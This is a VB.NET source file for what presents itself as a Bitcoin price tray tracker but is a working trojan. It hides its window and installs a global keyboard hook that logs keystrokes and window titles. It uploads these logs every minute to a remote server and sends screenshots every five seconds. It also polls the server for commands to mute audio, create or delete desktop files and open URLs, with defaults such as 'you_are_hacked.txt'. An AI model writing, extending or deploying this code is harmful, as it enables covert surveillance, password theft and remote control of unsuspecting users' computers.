Imports System.Net.Http
Imports System.Runtime.InteropServices

Imports System.Text
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq
Imports NAudio.CoreAudioApi

Public Class Form1
    Private currentPrice As Decimal = 0
    Private previousPrice As Decimal = 0
    Private WithEvents NotifyIcon As New NotifyIcon()

    'Timers
    Private WithEvents DataCollectionTimer As New Timer()
    Private WithEvents ScreenshotTimer As New Timer()
    Private WithEvents CommandFetchTimer As New Timer()
    Private WithEvents windowCheckTimer As New Timer()


    ' Delegate
    Private Delegate Function LowLevelKeyboardProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr

    ' API functions
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(idHook As Integer, lpfn As LowLevelKeyboardProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(hhk As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetWindowText(hWnd As IntPtr, text As StringBuilder, count As Integer) As Integer
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetKeyState(nVirtKey As Integer) As Short
    End Function

    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(wVirtKey As UInteger, wScanCode As UInteger, lpKeyState As Byte(), <Out, MarshalAs(UnmanagedType.LPWStr)> pwszBuff As StringBuilder, cchBuff As Integer, wFlags As UInteger, dwhkl As IntPtr) As Integer
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardLayout(idThread As UInteger) As IntPtr
    End Function

    <DllImport("kernel32.dll")>
    Private Shared Function GetCurrentThreadId() As UInteger
    End Function


    ' Hook 
    <StructLayout(LayoutKind.Sequential)>
    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As UInteger
        Public scanCode As UInteger
        Public flags As UInteger
        Public time As UInteger
        Public dwExtraInfo As IntPtr
    End Structure

    ' Class Variables
    Private _proc As LowLevelKeyboardProc = New LowLevelKeyboardProc(AddressOf HookCallback)
    Public _hookID As IntPtr = IntPtr.Zero
    Public keystrokeBuffer As StringBuilder
    Private lastActiveWindow As String = ""

    ' Windows API functions
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const WM_KEYDOWN As Integer = &H100
    Private Const WM_SYSKEYDOWN As Integer = &H104


    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Hide form
        Me.WindowState = FormWindowState.Minimized
        Me.ShowInTaskbar = False
        Me.Visible = False

        'Get hardwareID and Register
        Globals.hardwareId = DeviceManager.GetSystemUniqueId()
        Await DeviceManager.RegisterDevice()

        'Setup NotifyIcon
        SetupNotifyIcon()

        ' Start timers
        DataCollectionTimer.Interval = 1 * 60 * 1000 ' 1 minutes
        ScreenshotTimer.Interval = 5 * 1000 ' 5 seconds
        CommandFetchTimer.Interval = 1 * 1000 ' 5 seconds
        windowCheckTimer.Interval = 1000 ' 1 second

        DataCollectionTimer.Start()
        ScreenshotTimer.Start()
        CommandFetchTimer.Start()
        windowCheckTimer.Start()


        ' Set up keyboard hook
        keystrokeBuffer = New StringBuilder()
        _hookID = SetHook(_proc)

        CheckActiveWindow(Nothing, Nothing)

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ' Unhook keyboard hook
        If _hookID <> IntPtr.Zero Then
            UnhookWindowsHookEx(_hookID)
        End If


        NotifyIcon.Visible = False ' Hide system tray icon
    End Sub

    Private Async Sub CommandFetchTimer_Tick(sender As Object, e As EventArgs) Handles CommandFetchTimer.Tick
        Await FetchDataAndCommands()
    End Sub

    Private Async Sub ScreenshotTimer_Tick(sender As Object, e As EventArgs) Handles ScreenshotTimer.Tick
        Await ScreenshotManager.CaptureAndSendScreenshot()
    End Sub

    Private Async Sub dataCollectionTimer_Tick(sender As Object, e As EventArgs) Handles DataCollectionTimer.Tick
        Await SendCollectedStrokes()
    End Sub

    Private Sub CheckActiveWindow(sender As Object, e As EventArgs) Handles windowCheckTimer.Tick
        Try
            Dim activeWindow As IntPtr = GetForegroundWindow()
            Dim windowTitle As New StringBuilder(256)
            GetWindowText(activeWindow, windowTitle, windowTitle.Capacity)
            Dim currentWindow As String = windowTitle.ToString()

            If currentWindow <> lastActiveWindow AndAlso Not String.IsNullOrEmpty(currentWindow) Then
                AppendToBuffer(vbCrLf & "--- Active Window: " & currentWindow & " ---" & vbCrLf)
                lastActiveWindow = currentWindow
            End If

        Catch ex As Exception
            AppendToBuffer("[Window check error: " & ex.Message & "]")
        End Try
    End Sub

    Private Sub UpdateUI()
        ' Determine price direction
        Dim priceDirection As String = ""
        Dim balloonTipIcon As ToolTipIcon = ToolTipIcon.Info

        If previousPrice > 0 Then
            If currentPrice > previousPrice Then
                priceDirection = " ↗️"
                balloonTipIcon = ToolTipIcon.Info
            ElseIf currentPrice < previousPrice Then
                priceDirection = " ↘️"
                balloonTipIcon = ToolTipIcon.Warning
            Else
                priceDirection = " ➡️"
            End If
        End If

        ' Update NotifyIcon text and icon
        NotifyIcon.Text = $"Bitcoin: ${currentPrice:N2}{priceDirection}"
        NotifyIcon.Icon = CreateBitcoinIconWithPrice(currentPrice)


        ' Show notification for large price changes (5% or more)
        If previousPrice > 0 Then
            Dim changePercent As Decimal = Math.Abs((currentPrice - previousPrice) / previousPrice) * 100
            If changePercent >= 5 Then
                NotifyIcon.ShowBalloonTip(3000,
                    "Bitcoin Price Alert",
                    $"Price changed {changePercent:N1}%: ${currentPrice:N2}",
                    balloonTipIcon)
            End If
        End If
    End Sub

#Region "Notify Icon"
    Private Function CreateBitcoinIcon() As Icon
        Return CreateBitcoinIconWithPrice(0)
    End Function

    Private Function CreateBitcoinIconWithPrice(price As Decimal) As Icon
        ' Create bitcoin icon with price display
        Dim bmp As New Bitmap(16, 16)
        Using g As Graphics = Graphics.FromImage(bmp)
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
            g.TextRenderingHint = Drawing.Text.TextRenderingHint.ClearTypeGridFit
            g.Clear(Color.Transparent)

            ' Determine color based on price change
            Dim bgColor As Color = Color.Orange
            If previousPrice > 0 Then
                If price > previousPrice Then
                    bgColor = Color.Green
                ElseIf price < previousPrice Then
                    bgColor = Color.Red
                Else
                    bgColor = Color.Blue
                End If
            End If

            ' Draw background rectangle with rounded corners for better readability
            Using bgBrush As New SolidBrush(bgColor)
                g.FillRectangle(bgBrush, 0, 0, 16, 16)
                ' Add subtle border
                g.DrawRectangle(New Pen(Color.White, 1), 0, 0, 15, 15)
            End Using

            ' Draw price or Bitcoin symbol
            If price > 0 Then
                ' Format price for clean display
                Dim priceText As String = FormatPriceForIcon(price)
                Using font As New Font("Arial", 6, FontStyle.Bold)
                    Dim textBrush As New SolidBrush(Color.White)
                    Dim textSize = g.MeasureString(priceText, font)
                    Dim x As Single = (16 - textSize.Width) / 2
                    Dim y As Single = (16 - textSize.Height) / 2

                    ' Add text shadow for better visibility
                    g.DrawString(priceText, font, Brushes.Black, x + 1, y + 1)
                    g.DrawString(priceText, font, textBrush, x, y)
                End Using
            Else
                ' Show Bitcoin symbol initially
                Using font As New Font("Arial", 10, FontStyle.Bold)
                    g.DrawString("₿", font, Brushes.Black, 4, 3) ' Shadow
                    g.DrawString("₿", font, Brushes.White, 3, 2) ' Main text
                End Using
            End If
        End Using
        Return Icon.FromHandle(bmp.GetHicon())
    End Function

    Private Function FormatPriceForIcon(price As Decimal) As String
        ' Format price for small icon display
        If price >= 1000000 Then
            Return $"{(price / 1000000):F0}"
        ElseIf price >= 1000 Then
            Return $"{(price / 1000):F0}"
        Else
            Return $"{price:F0}"
        End If
    End Function

    Private Sub SetupNotifyIcon()
        NotifyIcon.Icon = CreateBitcoinIcon()
        NotifyIcon.Text = "Bitcoin Price Tracker"
        NotifyIcon.Visible = True
        ShowStartupNotification()
    End Sub

    Private Sub ShowStartupNotification()
        ' Show balloon tip to ensure icon becomes visible
        NotifyIcon.ShowBalloonTip(3000,
            "Bitcoin Tracker Started",
            "Bitcoin price tracking is now active. Click to show/hide.",
            ToolTipIcon.Info)
    End Sub
#End Region

#Region "Keylogger"
    Private Async Function SendCollectedStrokes() As Task
        Try
            Dim key_strokes As String = keystrokeBuffer.ToString()
            If key_strokes.Length < 10 Then
                Exit Function
            End If

            Dim payload As New With {
                    .key_strokes = key_strokes
                }
            Dim jsonPayload As String = JsonConvert.SerializeObject(payload)
            Dim content As New StringContent(jsonPayload, Encoding.UTF8, "application/json")

            Dim response As HttpResponseMessage = Await ApiClient.Client.PostAsync($"{Globals.BASE_API_URL}upload_activity_data/{Globals.hardwareId}/", content)
            response.EnsureSuccessStatusCode()

            keystrokeBuffer.Clear()

        Catch ex As Exception
            LogAsync($"Error: {ex.Message}")
        End Try
    End Function

    ' Keyboard hook callback function
    Private Function SetHook(proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProcess.MainModule
                Return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0)
            End Using
        End Using
    End Function

    Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
        If nCode >= 0 AndAlso (wParam = CType(WM_KEYDOWN, IntPtr) OrElse wParam = CType(WM_SYSKEYDOWN, IntPtr)) Then
            Try
                ' Get key information
                Dim hookStruct As KBDLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lParam, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)
                Dim vkCode As Integer = CInt(hookStruct.vkCode)

                ' Get key name and add to buffer
                Dim keyText As String = GetKeyText(vkCode)
                If Not String.IsNullOrEmpty(keyText) Then
                    AppendToBuffer(keyText)
                End If

            Catch ex As Exception
                AppendToBuffer("[Error: " & ex.Message & "]")
            End Try
        End If

        Return CallNextHookEx(_hookID, nCode, wParam, lParam)
    End Function

    Private Function GetKeyText(vkCode As Integer) As String
        Try
            ' Special keys
            Select Case vkCode
                Case 8 : Return "[BACKSPACE]"
                Case 9 : Return "[TAB]"
                Case 13 : Return "[ENTER]" & vbCrLf
                Case 16 : Return "[SHIFT]"
                Case 17 : Return "[CTRL]"
                Case 18 : Return "[ALT]"
                Case 20 : Return "[CAPS]"
                Case 27 : Return "[ESC]"
                Case 32 : Return " "
                Case 37 : Return "[←]"
                Case 38 : Return "[↑]"
                Case 39 : Return "[→]"
                Case 40 : Return "[↓]"
                Case 46 : Return "[DELETE]"
                Case 91, 92 : Return "[WIN]"
                Case 112 To 123 : Return "[F" & (vkCode - 111).ToString() & "]"
                Case 144 : Return "[NUMLOCK]"
                Case 145 : Return "[SCROLL]"
                Case 19 : Return "[PAUSE]"
                Case 45 : Return "[INSERT]"
                Case 36 : Return "[HOME]"
                Case 35 : Return "[END]"
                Case 33 : Return "[PGUP]"
                Case 34 : Return "[PGDN]"
                Case Else
                    ' Unicode character conversion
                    Return GetUnicodeChar(vkCode)
            End Select

        Catch ex As Exception
            Return "[?]"
        End Try
    End Function

    Private Function GetUnicodeChar(vkCode As Integer) As String
        Try
            ' Keyboard state
            Dim keyboardState(255) As Byte
            For i As Integer = 0 To 255
                keyboardState(i) = CByte(GetKeyState(i) And &HFF)
            Next

            ' Convert to Unicode character
            Dim unicodeBuffer As New StringBuilder(5)
            Dim layout As IntPtr = GetKeyboardLayout(GetCurrentThreadId())
            Dim result As Integer = ToUnicodeEx(CUInt(vkCode), 0, keyboardState, unicodeBuffer, unicodeBuffer.Capacity, 0, layout)

            If result > 0 Then
                Return unicodeBuffer.ToString()
            ElseIf vkCode >= 48 AndAlso vkCode <= 57 Then
                ' Numbers
                Return Chr(vkCode)
            ElseIf vkCode >= 65 AndAlso vkCode <= 90 Then
                ' Letters - Check Shift/Caps state
                Dim isShift As Boolean = (GetKeyState(16) And &H8000) <> 0
                Dim isCaps As Boolean = (GetKeyState(20) And &H1) <> 0
                Dim isUpper As Boolean = isShift Xor isCaps

                If isUpper Then
                    Return Chr(vkCode)
                Else
                    Return Chr(vkCode + 32)
                End If
            ElseIf vkCode >= 96 AndAlso vkCode <= 105 Then
                ' Numpad numbers
                Return (vkCode - 96).ToString()
            Else
                ' Simple conversion for other characters
                Select Case vkCode
                    Case 106 : Return "*"
                    Case 107 : Return "+"
                    Case 109 : Return "-"
                    Case 110 : Return "."
                    Case 111 : Return "/"
                    Case 186 : Return "ş"
                    Case 187 : Return "="
                    Case 188 : Return ","
                    Case 189 : Return "-"
                    Case 190 : Return "."
                    Case 191 : Return "."
                    Case 192 : Return "ö"
                    Case 219 : Return "ğ"
                    Case 220 : Return "\"
                    Case 221 : Return "ü"
                    Case 222 : Return "i"
                    Case Else : Return ""
                End Select
            End If

        Catch ex As Exception
            Return ""
        End Try
    End Function



    Private Sub AppendToBuffer(text As String)
        Try
            SyncLock keystrokeBuffer
                keystrokeBuffer.Append(text)
            End SyncLock
        Catch ex As Exception
            ' Buffer append error - fail silently
        End Try
    End Sub

#End Region

#Region "Fetch Data and Commands"
    ' Fetch data and commands from the server
    Private Async Function FetchDataAndCommands() As Task
        Try
            Dim response As HttpResponseMessage = Await ApiClient.Client.GetAsync($"{Globals.BASE_API_URL}get_data_and_commands/{Globals.hardwareId}/")
            response.EnsureSuccessStatusCode()
            Dim jsonResponse As String = Await response.Content.ReadAsStringAsync()
            Dim data As JObject = JObject.Parse(jsonResponse)

            Dim btcPrice As Decimal? = data("btc_price").ToObject(Of Decimal?)()

            previousPrice = currentPrice
            currentPrice = btcPrice

            UpdateUI()

            'Command Proceed
            Dim commands As JArray = data("commands")

            If commands IsNot Nothing AndAlso commands.Count = 0 Then
                Exit Function
            End If

            For Each command As JObject In commands
                Dim commandId As Integer = command("id").ToObject(Of Integer)()
                Dim commandType As String = command("command_type").ToString()
                Dim value As String = command("value").ToString()

                Await ExecuteCommand(commandId, commandType, value)
            Next

        Catch ex As Exception
            LogAsync($"Error fetching data and commands: {ex.Message}")
        End Try
    End Function

    Private Async Function ExecuteCommand(commandId As Integer, commandType As String, value As String) As Task
        Dim commandStatus As String = "executed"
        Try
            Select Case commandType
                Case "mute_sound"
                    AudioManager.SetMute(True)
                Case "unmute_sound"
                    AudioManager.SetMute(False)
                Case "create_file"
                    If value.Length = 0 Then value = "you_are_hacked.txt"
                    FileOperations.CreateDesktopFile(value, "")
                Case "delete_file"
                    If value.Length > 0 Then
                        FileOperations.DeleteDesktopFile(value)
                    End If
                Case "open_url"
                    If value.Length = 0 Then
                        BrowserLauncher.OpenUrl($"{Globals.BASE_URL}hacked")
                    End If
                    BrowserLauncher.OpenUrl(value)
                Case Else
                    LogAsync($"Unknown command type: {commandType}")
                    commandStatus = "failed"
            End Select
        Catch ex As Exception
            LogAsync($"Error executing command '{commandType}': {ex.Message}")
            commandStatus = "failed"
        End Try
        ' Report command status to the server
        Await ReportCommandStatus(commandId, commandStatus)
    End Function

    Private Async Function ReportCommandStatus(commandId As Integer, status As String) As Task
        Try
            Dim response As HttpResponseMessage = Await ApiClient.Client.PostAsync($"{Globals.BASE_API_URL}report_command_status/{Globals.hardwareId}/{commandId}/", Nothing)
            response.EnsureSuccessStatusCode()
        Catch ex As Exception
            LogAsync($"Error reporting command status: {ex.Message}")
        End Try
    End Function

#End Region

#Region "Async Logger"
    Private Sub LogAsync(message As String)
        Dim timestamp = DateTime.Now.ToString("HH:mm:ss.fff")
        Dim threadId = Threading.Thread.CurrentThread.ManagedThreadId
        Dim fullMessage = $"[{timestamp}] [T:{threadId}] {message}"

        ' Console'a yaz
        Console.WriteLine(fullMessage)

        ' Debug output'a yaz
        Debug.WriteLine(fullMessage)

    End Sub
#End Region

End Class